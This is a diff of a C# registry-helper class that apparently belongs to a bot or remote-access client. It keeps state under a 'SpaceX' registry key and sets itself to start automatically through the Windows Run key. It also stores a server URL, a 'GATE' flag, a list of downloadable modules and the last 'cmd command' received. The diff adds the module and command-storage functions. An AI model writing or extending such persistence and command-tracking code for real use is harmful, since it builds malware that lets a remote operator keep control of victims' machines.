@@ -7,12 +7,16 @@
     class MyRegistry
     {
         private static string name = Helper.RandomID(6);
-                
-        public static void Check() //Проверка на реестр
+
+        //Проверка на реестр
+        /// <summary>
+        /// Check registry
+        /// </summary>
+        public static void Check()
         {
             try
             {
-                using (RegistryKey ProgramFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\"))
+                using (RegistryKey ProgramFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\", true))
                 {
                     if (ProgramFolder != null)
                     {}
@@ -26,7 +30,11 @@
             catch { }
         }
 
-        private static void AR() // автозапуск
+        // автозапуск
+        /// <summary>
+        /// Auto run
+        /// </summary>
+        private static void AR()
         {
             using (RegistryKey reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\"))
             {
@@ -35,7 +43,11 @@
             }
         }
 
-        private static void SetFirstSettings() // устанавливаем значения в реестре
+        // устанавливаем значения в реестре
+        /// <summary>
+        /// Set value in registry
+        /// </summary>
+        private static void SetFirstSettings()
         {
             using (RegistryKey CreateRegFolder = Registry.CurrentUser.CreateSubKey(@"Software\SpaceX\"))
             {
@@ -47,10 +59,17 @@
                     CreateRegFolder.DeleteValue("GATE");
                     CreateRegFolder.SetValue("GATE", "YES"); // меняем значение
                 }
+                CreateRegFolder.SetValue("CCom", "not"); // cmd command
             }
+            Registry.CurrentUser.CreateSubKey(@"Software\SpaceX\Modules"); // Создаем подраздел для модулей
         }
 
-        public static void SetURL(string URL) // устанавливаем ссылку в реестре
+        // устанавливаем ссылку в реестре
+        /// <summary>
+        /// Set URL in registry
+        /// </summary>
+        /// <param name="URL"></param>
+        public static void SetURL(string URL)
         {
             using (RegistryKey CreateRegFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\", true))
             {
@@ -59,7 +78,12 @@
             }
         }
 
-        public static string GetURL() // получаем ссылку из реестре
+        // получаем ссылку из реестра
+        /// <summary>
+        /// Get link from registry
+        /// </summary>
+        /// <returns></returns>
+        public static string GetURL()
         {
             string url = null;
             using (RegistryKey ProgramFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\"))
@@ -70,6 +94,73 @@
                 }
             }
             return url;
+        }
+
+        // Получаем список модулей
+        /// <summary>
+        /// Get modules list
+        /// </summary>
+        /// <returns></returns>
+        public static string GetModules()
+        {
+            try
+            {
+                string result = string.Empty;
+                using (RegistryKey modules = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\Modules"))
+                {
+                    for (int i = 0; ; i++)
+                    {
+                        object sr = modules.GetValue(i.ToString());
+                        if (sr != null)
+                        {
+                            result += sr.ToString() + " ";
+                        }
+                        else
+                        {
+                            break;
+                        }
+                    }
+                }
+                return result;
+            }
+            catch { return string.Empty; }
+        }
+
+        public static bool AddModule(int index, string name)
+        {
+            try
+            {
+                using (RegistryKey module = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\Modules", true))
+                {
+                    module.SetValue(index.ToString(), name);
+                }
+                return true;
+            }
+            catch { return false; }
+        }
+
+        public static bool UpdateCommand(string com)
+        {
+            try
+            {
+                using (RegistryKey CreateRegFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\", true))
+                {
+                    CreateRegFolder.DeleteValue("CCom");
+                    CreateRegFolder.SetValue("CCom", com);
+                }
+                return true;
+            }
+            catch { return false; }
+        }
+
+        public static string GetLastCommand()
+        {
+            string result = string.Empty;
+            using (RegistryKey CreateRegFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\"))
+            {
+                result = CreateRegFolder.GetValue("CCom").ToString();
+            }
+            return result;
         }
     }
 }
